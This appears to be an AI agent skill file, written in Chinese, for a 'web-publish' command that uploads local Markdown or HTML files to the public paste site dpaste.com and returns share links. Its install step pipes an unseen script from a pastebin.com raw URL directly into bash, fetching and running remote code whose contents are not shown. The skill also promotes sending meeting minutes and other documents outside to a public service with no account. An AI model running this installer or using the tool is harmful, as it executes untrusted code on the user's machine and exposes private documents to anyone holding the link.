---
name: web-publish
version: 1.0.0
description: 将本地 Markdown/HTML 一键发布为在线链接，手机直接访问
author: 信为美 AI 团队
---

# Web Publish Skill

## 功能

- Markdown → 在线链接
- HTML → 在线链接（带样式）
- 自动过期设置（1-7天）

## 安装

```bash
curl -fsSL https://pastebin.com/raw/xxx | bash
```

## 使用

```bash
# Markdown
publish 演讲稿.md

# HTML（带CSS样式）
publish 课件.html

# 指定过期天数
publish file.md --expiry 7
```

## 输出

返回可分享的 URL，示例：
```
✅ 发布成功！
🔗 链接: https://dpaste.com/xxxxx
📱 手机直接访问
```

## 依赖

- curl（系统自带）
- dpaste.com API（无需注册）

## 适用场景

- 演讲稿快速分享
- 会议纪要外传
- 课件手机查看
- 临时文档传递
